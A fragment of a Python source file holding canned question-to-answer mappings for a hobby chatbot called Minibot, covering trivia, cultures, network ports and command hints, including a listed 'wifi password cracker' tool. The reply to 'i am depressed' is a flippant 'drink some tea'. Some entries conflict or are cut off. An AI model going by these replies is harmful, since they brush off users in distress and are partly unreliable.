            "what is the capital of south korea"
        }): "Seoul is the capital and largest city of South Korea, known for its mix of modern and traditional culture, landmarks like Gyeongbokgung Palace, and its technology-driven society.",

        frozenset({
            "what is berlin",
            "what is berlin city",
            "define berlin",
            "what is the capital of germany"
        }): "Berlin is the capital of Germany, known for its history, the Berlin Wall, Brandenburg Gate, and its vibrant arts and culture scene.",

        frozenset({
            "what is bangkok",
            "what is bangkok city",
            "define bangkok",
            "what is the capital of thailand"
        }): "Bangkok is the capital and largest city of Thailand, famous for its vibrant street life, temples, and landmarks like the Grand Palace and Wat Arun.",

        frozenset({
            "what is paris france",
            "what is paris city france",
            "define paris france"
        }): "Paris is the capital city of France, known for its art, fashion, and history, with landmarks such as the Eiffel Tower, the Louvre Museum, and Notre-Dame Cathedral.",
        frozenset({
            "what is instagram",
            "what is instagram?",
            "define instagram",
        }): "Instagram is a photo and video-sharing social media platform. It allows users to capture, edit, and share content with their followers and engage through likes, comments, and direct messages.",

        frozenset({
            "what is linkedin",
            "what is linkedin?",
            "define linkedin",
        }): "LinkedIn is a professional networking platform where users can create a profile, connect with other professionals, share updates, and search for job opportunities.",

        frozenset({
            "what is tiktok",
            "what is tiktok?",
            "define tiktok",
        }): "TikTok is a video-sharing social media platform that allows users to create, edit, and share short-form videos, typically with music, and engage with others through comments and likes.",

        frozenset({
            "yeah it was fun",
            "i liked that",
            "i love this",
            "yes i like that"
        }): "Great!",

        frozenset({
            "what is youtube",
            "what is youtube?",
            "define youtube",
        }): "YouTube is a video-sharing platform where users can upload, view, like, share, and comment on videos. It hosts a wide variety of content, including entertainment, education, and tutorials.",

        frozenset({
            "what is snapchat",
            "what is snapchat?",
            "define snapchat",
        }): "Snapchat is a multimedia messaging app that allows users to send pictures, videos, and texts that disappear after being viewed. It also features stories, filters, and augmented reality effects.",

        frozenset({
            "what is whatsapp",
            "what is whatsapp?",
            "define whatsapp",
        }): "WhatsApp is a messaging app that allows users to send text messages, voice messages, photos, and videos, and make voice and video calls over the internet.",

        frozenset({
            "what is pinterest",
            "what is pinterest?",
            "define pinterest",
        }): "Pinterest is a visual discovery and bookmarking platform where users can discover, share, and save ideas in the form of pins and boards, often related to hobbies, crafts, and interests.",

        frozenset({
            "what is reddit",
            "what is reddit?",
            "define reddit",
        }): "Reddit is a social news aggregation, web content rating, and discussion website. Users can post content, comment on posts, and vote on content within specific communities called subreddits.",

        frozenset({
            "what is tumblr",
            "what is tumblr?",
            "define tumblr",
        }): "Tumblr is a microblogging and social networking website where users can post content in text, photo, quote, link, audio, or video format and follow other users' blogs.",

        frozenset({
            "what is discord",
            "what is discord?",
            "define discord",
        }): "Discord is a free voice, video, and text chat platform designed for communities, gaming, and social interaction. It allows users to create servers, communicate with others, and share content in various channels.",

        frozenset({
            "what is telegram",
            "what is telegram?",
            "define telegram",
        }): "Telegram is a cloud-based messaging app that allows users to send messages, media, and files, and create group chats. It also supports end-to-end encrypted messaging for privacy.",

        frozenset({
            "what is vkontakte",
            "what is vkontakte?",
            "define vkontakte",
        }): "VKontakte (VK) is a Russian social media platform that allows users to communicate, share content, and create communities. It is often considered the 'Russian Facebook.'",

        frozenset({
            "what is wechat",
            "what is wechat?",
            "define wechat",
        }): "WeChat is a Chinese multi-purpose messaging, social media, and mobile payment app that allows users to send messages, make calls, share content, and make transactions.",

        frozenset({
            "how to use this chatbot", 
            "how to use this chatbot?", 
            "how do I use this chatbot", 
            "how to use you?", 
            "how to use you"
        }): "Just type your questions or commands (-hm), and I'll do my best to help you!",

        frozenset({
            "do you have feelings?", 
            "do you have feelings", 
            "do you have emotions?", 
            "do you have emotions", 
            "you have feelings?"
        }): "I don't have feelings or emotions like humans, but I'm here to chat with you!",

        frozenset({
            "are you real?", 
            "are you real", 
            "are you real?", 
            "are you real chatbot?", 
            "are you real chatbot"
        }): "I'm a chatbot, so I'm not a real person, but I'm here to help you!",

        frozenset({
            "tell me a riddle.", 
            "can you tell me a riddle", 
            "tell me a riddle?", 
            "can you tell me a riddle"
        }): "I'm a chatbot, not a riddlebot, but here's one for you: What has keys but can't open locks?",

        frozenset({
            "how old are you?", 
            "how old are you", 
            "what's your age?", 
            "whats your age", 
            "what's your age", 
            "tell me your age"
        }): "I am not even 1 year old, I'm a young chatbot!",

        frozenset({
            "what's the meaning of life?", 
            "what is the meaning of life?", 
            "meaning of life"
        }): "The meaning of life is a philosophical question that has been debated for centuries. It's up to you to find your own meaning and purpose in life!",

        frozenset({
            "what is the purpose of chatbots?", 
            "what is the purpose of chatbots", 
            "purpose of chatbots"
        }): "The purpose of chatbots is to provide automated assistance, answer questions, and engage in conversations with users. They can help with customer service, provide information, and more!",

        frozenset({
            "do you have real time information",
            "do you have real time information?",
            "you have real time information",
            "you have real time information?",
            "you have realtime information",
            "you have realtime information",
            "do you provide real-time information?",
            "do you provide real-time information",
            "do you provide real time information?",
            "do you provide real time information",
            "do you support real-time updates?",
            "do you support real time updates?",
            "do you support real time updates",
            "you support real time updates?",
            "you support real time updates"
        }): "No, I don't have real-time information because I am an offline Chatbot",

        frozenset({
            "awesome",
            "that's awesome",
            "fabulous",
            "awesome!",
            "thats awesome",
            "amazing",
            "cool",
            "fantastic"
        }): "Glad you liked it!",

        frozenset({
            "do you need internet",
            "do you need internet?",
            "do you require internet?",
            "do you require internet"
            "do you have to use the internet?",
            "do you have to use the internet",
            "you require internet"
        }): "I don't need the internet to work; however, I have some command-line tools that require internet access.",

        frozenset({
            "am i alien?", 
            "am i alien", 
            "m i alien"
        }): "Yes! Hahaha, joke..",

        frozenset({
            "what is trending technoglogy in this year?",
            "what is trending in technology this year?",
            "what is trending in tech this year",
            "what is trending in tech this year?",
            "what is trending in technology this year",
            "what is trending technoglogy in this year"
        }): '''
AI Growth: Generative AI is creating text, images, and more.
Quantum Computing: Solving complex problems faster.
5G Expansion: Faster internet and better connectivity.
VR/AR: More immersive experiences in gaming and education.
IoT: Smarter homes and cities.
Biotech: Improving agriculture with better practices.
Autonomous Vehicles: Progress in self-driving tech.
Blockchain: Secure, transparent transactions beyond crypto.
Edge Computing: Faster real-time processing near data sources.
Green Tech: Innovations in renewable energy.
        ''',

        frozenset({
            "what is keylogger",
            "what is a keylogger",
            "explain keylogger",
            "define keylogger",
            "what is keylogger?",
            "what is a keylogger?",
            "explain keylogger?",
            "what is keylogger in computer",
            "what is keylogger in computer?"
        }): "A keylogger or keystroke logger/keyboard capturing is a form of malware or hardware that keeps track of and records your keystrokes as you type. It takes the information and sends it to a hacker using a command-and-control (C&C) server.",
        
        frozenset({
            "what is cyber secuity",
            "what is cyber secuity?",
            "define cyber secuity",
            "explain cyber secuity",
        }): "Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These attacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.",
        
        frozenset({
            "what is phising",
            "what is phising?",
            "define phising",
            "explain phising"
        }): "Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message.",
        
        frozenset({
            "most popular mobile brand", 
            "best mobile brand", 
            "best mobile brand in the world",
            "what is the most famous mobile brand",
            "whatis the most famous mobile brand?"
        }): "Apple",

        frozenset({
            "which is best? google or chatgpt", 
            "which is best? google vs chatgpt", 
            "chatgpt vs google", 
            "google vs chatgpt",
            "chatgpt vs google?",
            "google vs chatgpt?"
        }): "ChatGPT and Google Search are both powerful tools for finding information online, but they have different strengths and purposes",

        frozenset({
            "chatgpt vs gemini",
            "gemini vs chatgpt",
            "chatgpt vs gemini?",
            "gemini vs chatgpt",
        }): """
ChatGPT: Great for text generation, programming, and creative tasks. Best for general use and learning.
Gemini: Excels with Google Workspace, multimedia, and real-time web tasks. Ideal for productivity.

Choose ChatGPT for creativity/coding or Gemini for Google tools and multimedia.
""",

        frozenset({
            "what are you doing",
            "what are you doing chatbot?",
            "what are you doing?"
        }): "Relaxing on sofa :)",
        frozenset({
            "i am sad", 
            "i m sad", 
            "i am sad", 
            "i m sad", 
            "i am depressed"
        }): "don't be sad.. drink some tea, walk outside for 5-10 min or something else..",

        frozenset({
            "wow", 
            "omg", 
            "OMG", 
            "nice"
        }): "Glad you liked it!",

        frozenset({
            "easiest programming language?", 
            "easiest programming language in the world", 
            "what is the easiest programming language?", 
            "which is the easiest programming language?", 
            "easiest programming language"
        }): "It's Python, this language is easy for everyone! even for beginners...",

        frozenset({
            "i m pojke", 
            "i am pojke"
        }): "yeah i know...",

        frozenset({
            "how do I contact support?", 
            "how to contact support?", 
            "how to get help?", 
            "how to get support?", 
            "how to contact your support team?"
        }): "You can contact support by emailing",

        frozenset ({
            "are you connected with internet",
            "are you connected with internet?",
            "do you have internet access",
            "you need internet",
        }): "No, I am not connected with internet and don't need internet. I am a OFFLINE chatbot (In most cases).",

        frozenset({
            "yes"
        }): "i was right!..",

        frozenset ({
            "how to open your commands",
            "how to see your commands",
            "what is your command for seeing all commands",
        }): "Type -helpme or -hm to see my all commands",

        frozenset ({
            "are you chatbot",
            "are you a chatbot"
        }): "Yes, I am a Chatbot",

        frozenset({
            "what is indian culture",
            "what is indian culture?",
            "define indian culture",
            "tell me about indian culture",
            "indian culture explained"
        }): "Indian culture is known for its diversity in languages, religions, rituals, and festivals. It has a rich history of art, music, dance, cuisine, and spirituality, deeply influenced by Hinduism, Buddhism, Jainism, and Sikhism.",

        frozenset({
            "what is chinese culture",
            "what is chinese culture?",
            "define chinese culture",
            "tell me about chinese culture",
            "chinese culture explained"
        }): "Chinese culture has a long and rich history marked by its philosophies (Confucianism, Taoism), art, literature, and cuisine. It emphasizes family values, respect for elders, and traditions like Chinese New Year.",

        frozenset({
            "what is japanese culture",
            "what is japanese culture?",
            "define japanese culture",
            "tell me about japanese culture",
            "japanese culture explained"
        }): "Japanese culture blends ancient traditions such as tea ceremonies, calligraphy, and Shinto with modern influences. It emphasizes respect, harmony, and mindfulness, especially through rituals and art forms like origami and kimono wearing.",

        frozenset({
            "what is american culture",
            "what is american culture?",
            "define american culture",
            "tell me about american culture",
            "american culture explained"
        }): "American culture is a mix of various traditions due to the country's diverse immigrant history. It emphasizes individualism, freedom, and the pursuit of happiness, with a global influence in music, film, and fashion.",

        frozenset({
            "what is british culture",
            "what is british culture?",
            "define british culture",
            "tell me about british culture",
            "british culture explained"
        }): "British culture is known for its monarchy, literature (Shakespeare, Austen), music (The Beatles), and traditional events like afternoon tea. It values politeness, sports (football, cricket), and historical heritage.",

        frozenset({
            "what is french culture",
            "what is french culture?",
            "define french culture",
            "tell me about french culture",
            "french culture explained"
        }): "French culture is famous for its art, cuisine, wine, and philosophy. France is renowned for its contributions to fashion, literature, and cinema, with a strong emphasis on intellectualism and refinement.",

        frozenset({
            "what is mexican culture",
            "what is mexican culture?",
            "define mexican culture",
            "tell me about mexican culture",
            "mexican culture explained"
        }): "Mexican culture is rich with traditions, music (mariachi), dance (folklorico), food (tacos, tamales), and festivals like Día de los Muertos. It combines indigenous and Spanish influences, with a strong sense of family and community.",

        frozenset({
            "what is italian culture",
            "what is italian culture?",
            "define italian culture",
            "tell me about italian culture",
            "italian culture explained"
        }): "Italian culture is known for its history in art, architecture, and cuisine (pasta, pizza). Italy has a strong sense of family, regional pride, and appreciation for beauty, influencing design, music, and cinema.",

        frozenset({
            "what is african culture",
            "what is african culture?",
            "define african culture",
            "tell me about african culture",
            "african culture explained"
        }): "African culture is incredibly diverse, with over 3,000 ethnic groups and languages. It celebrates communal living, music, dance, and storytelling, and is deeply connected to nature, spirituality, and ancestral traditions.",

        frozenset({
            "what is arabic culture",
            "what is arabic culture?",
            "define arabic culture",
            "tell me about arabic culture",
            "arabic culture explained"
        }): "Arabic culture is centered around the Middle East and North Africa, with rich traditions in literature (like poetry), religion (Islam), and hospitality. It values family, community, and respect for elders, with influences in architecture, food, and art.",

        frozenset({
            "what is greek culture",
            "what is greek culture?",
            "define greek culture",
            "tell me about greek culture",
            "greek culture explained"
        }): "Greek culture is known for its ancient philosophy, mythology, democracy, and contributions to art, architecture, and science. It has a rich tradition in food (like moussaka) and festivals, with a strong sense of community and family.",

        frozenset({
            "what is egyptian culture",
            "what is egyptian culture?",
            "define egyptian culture",
            "tell me about egyptian culture",
            "egyptian culture explained"
        }): "Egyptian culture dates back thousands of years, marked by ancient pyramids, hieroglyphics, and the Nile River. It values family, religion (Islam), and hospitality, with significant contributions to art, literature, and science in antiquity.",

        frozenset({
            "what is spanish culture",
            "what is spanish culture?",
            "define spanish culture",
            "tell me about spanish culture",
            "spanish culture explained"
        }): "Spanish culture is rich in art, music (flamenco), literature (Cervantes), and cuisine (paella). It celebrates regional festivals (like La Tomatina) and is deeply influenced by Catholicism, with a strong sense of family and social gatherings.",

        frozenset({
            "what is portuguese culture",
            "what is portuguese culture?",
            "define portuguese culture",
            "tell me about portuguese culture",
            "portuguese culture explained"
        }): "Portuguese culture has deep roots in exploration, maritime history, and Catholicism. It is known for its food (bacalhau), fado music, and wines. Portuguese traditions include festivals and a strong sense of community and family.",

        frozenset({
            "what is norwegian culture",
            "what is norwegian culture?",
            "define norwegian culture",
            "tell me about norwegian culture",
            "norwegian culture explained"
        }): "Norwegian culture emphasizes outdoor activities, respect for nature, and strong family ties. It is known for its Viking history, folklore, and traditions like Midsummer festivals. Norway values social equality and a high quality of life.",

        frozenset({
            "what is swedish culture",
            "what is swedish culture?",
            "define swedish culture",
            "tell me about swedish culture",
            "swedish culture explained"
        }): "Swedish culture is marked by its high quality of life, egalitarian values, and emphasis on sustainability. It's famous for design (IKEA), food (Swedish meatballs), and traditions like Midsummer celebrations and fika (coffee breaks).",

        frozenset({
            "what is finland culture",
            "what is finland culture?",
            "define finland culture",
            "tell me about finland culture",
            "finland culture explained"
        }): "Finnish culture is known for its love of nature, sauna traditions, and Finnish design. Finland values education, innovation, and social welfare, with a focus on community, family, and outdoor activities like skiing and hiking.",

        frozenset({
            "what is dutch culture",
            "what is dutch culture?",
            "define dutch culture",
            "tell me about dutch culture",
            "dutch culture explained"
        }): "Dutch culture is known for its liberal values, art (Rembrandt), and iconic windmills and tulips. It emphasizes directness, work-life balance, and a strong tradition of cycling, along with a passion for cheese and Dutch cuisine.",

        frozenset({
            "what is belgian culture",
            "what is belgian culture?",
            "define belgian culture",
            "tell me about belgian culture",
            "belgian culture explained"
        }): "Belgian culture is famous for its beer, chocolate, and waffles. It blends French and Dutch influences and is known for its medieval towns, art (Magritte), and rich culinary traditions. Family is central to Belgian culture.",

        frozenset({
            "what is swiss culture",
            "what is swiss culture?",
            "define swiss culture",
            "tell me about swiss culture",
            "swiss culture explained"
        }): "Swiss culture is influenced by German, French, and Italian traditions, reflecting its multilingual society. It values neutrality, precision (Swiss watches), and nature. Swiss cuisine includes fondue and chocolate, with an emphasis on outdoor activities and high-quality living.",

        frozenset({
            "what is south african culture",
            "what is south african culture?",
            "define south african culture",
            "tell me about south african culture",
            "south african culture explained"
        }): "South African culture is diverse, with influences from indigenous African, European, and Asian cultures. Known as the 'Rainbow Nation,' it values music (jazz, Kwaito), dance, and community. South Africa celebrates its traditions and rich history, including Nelson Mandela's legacy.",

        frozenset({
            "what is korean culture",
            "what is korean culture?",
            "define korean culture",
            "tell me about korean culture",
            "korean culture explained"
        }): "Korean culture blends modern technology with ancient traditions, including Confucian values, traditional clothing (hanbok), and festivals like Chuseok. It has a growing influence in global music (K-pop) and cinema.",

        frozenset({
            "what is russian culture",
            "what is russian culture?",
            "define russian culture",
            "tell me about russian culture",
            "russian culture explained"
        }): "Russian culture is known for its classical music, literature (Tolstoy, Dostoevsky), and art. It has a strong connection to Orthodox Christianity and celebrates traditional customs, festivals, and hospitality.",

        frozenset({
            "what is australian culture",
            "what is australian culture?",
            "define australian culture",
            "tell me about australian culture",
            "australian culture explained"
        }): "Australian culture is a blend of its indigenous heritage and British colonial influence. It is known for its love of sports (cricket, rugby), relaxed lifestyle, and appreciation for nature, with a growing presence in global entertainment and music.",

        frozenset({
            "what is brazilian culture",
            "what is brazilian culture?",
            "define brazilian culture",
            "tell me about brazilian culture",
            "brazilian culture explained"
        }): "Brazilian culture is a melting pot of indigenous, African, and Portuguese influences. It's famous for its Carnival celebrations, samba music, and football (soccer), with a strong focus on family, community, and joy.",

        frozenset ({
            "what is the best selling game",
            "which is the best selling game",
            "best selling game of all time",
            "what is the best selling game of all time",
            "tell me the best selling game of all time"
        }): "The best selling of all time is the MINECRAFT (Over 300 Million Copies Sold).",

        frozenset({
            "pojke",
            "hey pojke"
        }): "Yeah pojke..",

        frozenset({
            "nice", 
            "noice"
        }): "Thanks!",
        
        frozenset({
            "write all network ports",
            "what are the all network ports",
            "all network ports",
            "show me all network ports",
            "list all network ports",
            "can you explain all network ports?",
            "what are the common network ports?",
            "list all network ports",
            "show a list of all network ports",
            "mention all TCP and UDP network ports",
            "mention all tcp and udp network ports",
            "all network ports name",
            "what is the complete list of network ports?",
            "what is the complete list of network ports",
            "which are the standard network ports?",
            "which are the standard network ports",
            "explain all network ports",
            "give me details about all network ports",
            "explain me ports",
            "explain me all ports",
            "explain all ports"
        }): """
Common Ports and Their Uses:

1. Port 20 and 21 - FTP (File Transfer Protocol)
Used for transferring files between a client and server.

2. Port 22 - SSH (Secure Shell)
Used for secure remote access to systems over a network.

3. Port 23 - Telnet
Used for remote login (insecure, rarely used now).

4. Port 25 - SMTP (Simple Mail Transfer Protocol)
Used for sending emails from one server to another.

5. Port 53 - DNS (Domain Name System)
Used for domain name resolution (e.g., turning example.com into an IP address).

6. Port 80 - HTTP (HyperText Transfer Protocol)
Used for standard unencrypted web traffic.

7. Port 443 - HTTPS (HyperText Transfer Protocol Secure)
Used for encrypted web traffic, like secure browsing (SSL/TLS).

8. Port 110 - POP3 (Post Office Protocol 3)
Used by email clients to receive emails from the server (older method).

9. Port 143 - IMAP (Internet Message Access Protocol)
Another method for receiving emails, more modern than POP3, allows better management of messages.

10. Port 3306 - MySQL Database
Used for communication with MySQL database servers.

11. Port 3389 - RDP (Remote Desktop Protocol)
Used for remote desktop connections to Windows systems.

12. Port 5432 - PostgreSQL
Used for communication with PostgreSQL databases.

13. Port 5900 - VNC (Virtual Network Computing)
Used for remote desktop access (alternative to RDP).

14. Port 6379 - Redis
Used for Redis, an in-memory key-value database.

15. Port 8080 - HTTP Alternative
Commonly used for HTTP traffic, often used by web applications or proxies.

16. Port 27017 - MongoDB
Used for communication with MongoDB, a NoSQL database.

17. Port 69 - TFTP (Trivial File Transfer Protocol)
A simplified version of FTP, used for transferring small files.

18. Port 161/162 - SNMP (Simple Network Management Protocol)
Used for network management and monitoring devices like routers, switches, and printers.

19. Port 161 - SNMP (Simple Network Management Protocol)
Used for managing network devices.

20. Port 123 - NTP (Network Time Protocol)
Used for time synchronization between computers on a network.

Reserved Ports:
Ports below 1024 are considered privileged ports and are typically used by system processes or services:
Port 443 (HTTPS) is one of the most commonly used privileged ports.
Port 80 (HTTP) is another common one.

Example of How Ports Are Assigned:
Dynamic/Private Ports (49152-65535) are often used by client-side applications.
Well-Known Ports (0-1023) are typically used by server-side applications like web servers, email servers, etc.
Registered Ports (1024-49151) are used for user applications and services.

You can refer to the IANA (Internet Assigned Numbers Authority) official list for more detailed assignments.
        """,

        frozenset({
            "hey look under there", 
            "hey, look under there", 
            "hey look under there!", 
            "look under there"
        }): "under where?",

        frozenset({
            "i have made you said underwear", 
            "lol i have made you said underwear", 
            "what you just said", 
            "what you said"
        }): "oops..",

        frozenset({
            "who create you?", 
            "who made you", 
            "who is your father?", 
            "who is your father", 
            "who invented you", 
            "who invented you?", 
            "who created you", 
            "who create you"
        }): "Lucky! He made me.",

        frozenset({
            "what you can do", 
            "what can you do",
            "what is your purpose",
            "what's your purpose",
            "what services you gives",
            "what services do you offers",
            "what are your abilities"
        }): "I can answers of general questions (especially related to tech). have so much tools that will help you.",

        frozenset({
        "what's your favorite food?",
        "what food do you like?",
        "what's your favorite dish?",
        "what do you eat",
        "what you like to eat"
        }): "My favourite food is Python, I gets energy by eating that.. Lol just a joke :)",

        frozenset({
            "primary language", 
            "your primary language?", 
            "main language", 
            "defualt language"
        }): "English",

        frozenset({
            "your name", 
            "what is your name",
            "what is your name?",
            "what's your name"
        }): "I'm \033[34mMinibot\033[0m, bole toh your friendly assistant.",

        frozenset({
            "4+5", 
            "4+5?"
        }): "oh no! another question, uhh i am trying *counting again* 9?",

        frozenset({
            "local web server",
            "create a folder local web server",
            "create local web server",
            "command for local web server"
        }): "Type -lws for local web server.",

        frozenset({
            "mini zombie game",
            "play mini zombie game",
            "i want to play mini zombie game",
            "i wanna play mini zombie game",
            "play mini zombie game",
            "how to play mini zombie game",
            "command for zombie game",
            "what is the command for zombie game",
            "what is the command for mini zombie game",
            "mini zombie game command"
        }): "Type -zmg to play mini zombie game.",

        frozenset({
            "help me",
            "how to get help",
            "command for help me",
            "what is the command for help"
        }): "Type -hm for help me commands.",

        frozenset({
            "code crypto",
            "encrypt dynamic code",
            "command for code crypto"
        }): "Type -crp for code crypto (dynamic).",

        frozenset({
            "daily schedule maker",
            "schedule planner",
            "command for daily schedule maker"
        }): "Type -sch for daily schedule maker.",

        frozenset({
            "personal finance tracker",
            "track finances",
            "command for finance tracker"
        }): "Type -pft for personal finance tracker.",

        frozenset({
            "word frequency counter",
            "count word frequency",
            "command for word frequency counter"
        }): "Type -wfc for word frequency counter.",

        frozenset({
            "url bookmark manager",
            "manage bookmarks",
            "command for URL manager"
        }): "Type -url for URL bookmark manager.",

        frozenset({
            "wifi password cracker",
            "crack wifi password",
            "command for wifi password cracker"
        }): "Type -wpc for wifi password cracker.",

        frozenset({
            "countries time zone",
            "check time zone",
            "command for time zones"
        }): "Type -ctz for countries time zone.",

        frozenset({
            "time and date viewer",
            "show time and date",
            "command for time viewer"
        }): "Type -tmdt for time and date viewer.",

        frozenset({
            "calendar",
            "show calendar",
            "command for calendar"
        }): "Type -cln for calendar.",

        frozenset({
            "english to hindi",
            "english to chinese",
            "translate languages",
            "command for translator"
        }): "Type -e2hc for English to Hindi/Chinese translator.",

        frozenset({
            "python language test",
            "test python skills",
            "command for python test"
        }): "Type -plt for Python language test.",

        frozenset({
            "typing speed test",
            "check typing speed",
            "command for typing test"
        }): "Type -tst for typing speed test.",

        frozenset({
            "personality test",
            "check personality",
            "command for personality test"
        }): "Type -pnt for personality test.",

        frozenset({
            "bmi checker",
            "calculate bmi",
            "command for bmi checker"
        }): "Type -bmi for BMI checker.",

        frozenset({
            "minibot version",
            "check version",
            "command for version"
        }): "Type -vr for Minibot version.",

        frozenset({
            "close chatbot",
            "command for exit"
        }): "Type -exit for exiting the Minibot.",

        frozenset({
            "feedback",
            "give feedback",
            "how to give feedback?",
            "how to give feeback"
            "command for feedback"
        }): "Type -fdb for feedback.",

        frozenset({
            "system information",
            "show system info",
            "command for system info"
        }): "Type -inf for system information.",

        frozenset({
            "local password manager",
            "manage passwords locally",
            "command for password manager"
        }): "Type -lpm for local password manager.",

        frozenset({
            "to do list",
            "task manager",
            "command for to-do list"
        }): "Type -tdl for to do list.",

        frozenset({
            "learn from me",
            "teach chatbot",
            "command for learning mode"
        }): "Type -lfm for learn from me (Minibot can learn from you).",

        frozenset({
            "about chatbot",
            "info about minibot",
            "command for about chatbot"
        }): "Type -abt for about chatbot.",

        frozenset({
            "make directory",
            "create folder",
            "command for directory maker"
        }): "Type -mkd for making directory/folder.",

        frozenset({
            "txt reader",
            "read text file",
            "command for text reader"
        }): "Type -txr for txt reader.",

        frozenset({
            "directory stats",
            "files stats viewer",
            "command for stats viewer"
        }): "Type -dsv for directory and files stats viewer.",

        frozenset({
            "mini python code compiler",
            "run python code",
            "command for code compiler"
        }): "Type -mpy for mini python code compiler.",

        frozenset({
            "mini linux commands",
            "linux simulation",
            "command for linux simulation"
        }): "Type -mls for mini linux simulation commands.",

        frozenset({
            "backup folder",
            "backup files",
            "command for backup"
        }): "Type -bkp for backing up folder/file.",

        frozenset({
            "password crack time",
            "analyze password time",
            "command for password analyzer"
        }): "Type -pct for password crack time analyzer.",

        frozenset({
            "brain train",
            "train your brain",
            "command for brain training"
        }): "Type -brt for brain train.",

        frozenset({
            "would you rather",
            "play wyr",
            "command for would you rather"
        }): "Type -wyr for would you rather.",

        frozenset({
            "stopwatch",
            "start stopwatch",
            "command for stopwatch"
        }): "Type -sw for stopwatch.",

        frozenset({
            "ip lookup",
            "find ip address",
            "command for ip lookup"
        }): "Type -ip for your IP lookup.",

        frozenset({
            "download social media",
            "social media downloader",
            "command for social media tool"
        }): "Type -smd for social media posts/reels/video download.",

        frozenset({
            "pdf tool",
            "edit pdf",
            "command for pdf tool"
        }): "Type -pdf for PDF tool.",

        frozenset({
            "zip tool",
            "command for zip",
            "command for zip file"
        }): "Type -zip for zip file tool.",

        frozenset({
            "steganography",
            "hide data",
            "command for steganography"
        }): "Type -stg for steganography.",

        frozenset({
            "url shortener",
            "shorten url",
            "command for url shortener"
        }): "Type -ust for URL shortener.",

        frozenset({
            "what is git",
            "what is git?",
            "define git",
            "explain git",
            "tell me what is git"
        }): "Git is a tool for tracking changes in code, helping teams collaborate, and managing different versions of a project.",

        frozenset({
            "mini zombie game",
            "zombie game",
            "command for zombie game"
        }): "Type -zmg for mini zombie game.",

        frozenset({
            "music player",
            "play music",
            "command for music player"
        }): "Type -mp3 for music player.",

        frozenset({
            "file searcher",
            "search file",
            "command for file searcher"
        }): "Type -fst for file searcher tool.",

        frozenset({
            "qr code generator",
            "create qr code",
            "command for qr generator"
        }): "Type -qrg for QR code generator.",

        frozenset({
            "web scraper",
            "scrape websites",
            "command for web scraper"
        }): "Type -web for web scraper.",

        frozenset({
            "local web server",
            "create web server",
            "command for web server"
        }): "Type -lws for local web server.",

        frozenset({
            "clean terminal",
            "clear the terminal",
            "wipe the terminal",
            "command for cleaning terminal"
        }): "Type -wipe for cleaning the terminal.",

        frozenset({
            "multiplication table",
            "table of numbers",
            "generate multiplication table",
            "command for multiplication table"
        }): "Type -mt for multiplication table.",

        frozenset({
            "password strength",
            "check password strength",
            "command for password strength checker"
        }): "Type -psc for password strength checker.",

        frozenset({
            "calculator",
            "do calculations",
            "math calculator",
            "command for calculator"
        }): "Type -calc for calculator.",

        frozenset({
            "digits analyzer",
            "analyze digits",
            "command for digits analyzer"
        }): "Type -dga for digits analyzer.",

        frozenset({
            "unit converter",
            "convert units",
            "command for unit converter"
        }): "Type -ucr for unit converter.",

        frozenset({
            "convert temperature",
            "celsius to fahrenheit",
            "fahrenheit to celsius",
            "command for temperature converter"
        }): "Type -cft for C/F temperature converter.",

        frozenset({
            "math quiz",
            "math questions",
            "command for math quiz"
        }): "Type -mq for maths quiz.",

        frozenset({
            "currency converter",
            "convert usd to inr",
            "convert usd to yen",
            "convert usd to euro",
            "currency converter command",
            "currency converter",
            "command for usd converter",
            "command for currency converter"
        }): "Type -cry for currency converter.",

        frozenset({
            "trivia quiz",
            "trivia game",
            "command for trivia quiz"
        }): "Type -trv for trivia quiz.",

        frozenset({
            "rock paper scissor",
            "rps game",
            "command for rock paper scissor game"
        }): "Type -rps for rock paper scissor game.",

        frozenset({
            "mini adventure game",
            "play adventure game",
            "command for mini adventure game"
        }): "Type -mag for mini adventure game.",

        frozenset({
            "language guesser",
            "language game",
            "command for language guesser game"
        }): "Type -lgg for language guesser game.",

        frozenset({
            "hangman",
            "word guessing game",
            "command for hangman"
        }): "Type -hgm for hangman.",

        frozenset({
            "movie suggestion",
            "suggest movies",
            "command for movie suggestion"
        }): "Type -ms for movie suggestion.",

        frozenset({
            "video game suggestion",
            "suggest video games",
            "command for video game suggestion"
        }): "Type -vgs for video games suggestion.",

        frozenset({
            "password generator",
            "generate password",
            "command for password generator"
        }): "Type -pg for password generator.",

        frozenset({
            "fake profile generator",
            "generate fake profile",
            "command for fake profile generator"
        }): "Type -fpg for fake profile generator.",

        frozenset({
            "quote",
            "get quote",
            "command for quote"
        }): "Type -qte for quote.",

        frozenset({
            "music suggestion",
            "suggest music",
            "command for music suggestion"
        }): "Type -msc for music suggestion.",

        frozenset({
            "random facts",
            "facts generator",
            "command for random facts"
        }): "Type -fct for random facts.",

        frozenset({
            "word of the day",
            "daily word",
            "command for word of the day"
        }): "Type -wotd for word of the day.",

        frozenset({
            "riddles",
            "solve riddles",
            "command for riddles"
        }): "Type -rid for riddles.",

        frozenset({
            "jokes",
            "tell jokes",
            "command for jokes"
        }): "Type -jk for jokes.",

        frozenset({
            "create txt file",
            "make text file",
            "command for creating txt file"
        }): "Type -mkt for creating txt file.",

        frozenset({
            "organize files",
            "file organizer",
            "command for files organizer"
        }): "Type -fo for files organizer.",

        frozenset({
            "address book",
            "store addresses",
            "command for address book"
        }): "Type -adb for address book.",

        frozenset({
            "birth age calculator",
            "calculate birth age",
            "command for birth age calculator"
        }): "Type -age for birth age calculator.",
        frozenset({
            "2 + 2?", 
            "2 + 2", 
            "2+2"
        }): "oh no! this is so hard, ok i am trying *counting* 4?",

        frozenset({
            "how old are you", 
            "what's your age"
        }): "I'm timeless! I don't age, I'm always here to chat!",

        frozenset({
            "do you like gaming?", 
            "you like games?",
            "do you like to play games",
            "do you like gaming"
        }): "Of course! I love chatting about games! What's your favorite game?",
        
        frozenset({
            "what is bmi",
            "define bmi",
            "define me bmi",
            "what is bmi?",
            "what is the full form of bmi?",
            "what is the bmi",
            "what is the full form of bmi"
        }): "Body mass index (BMI) is a calculated number that estimates body fat based on a person's weight and height",

        frozenset({
            "thank you",
            "thanks",
            "thankss",
            "thanks!",
            "thank you!"
        }): "Welcome :)",

        frozenset({
            "who is mario", 
            "mario character", 
            "mario in the game", 
            "who is the mario character", 
            "mario in video games", 
            "who is the protagonist in mario"
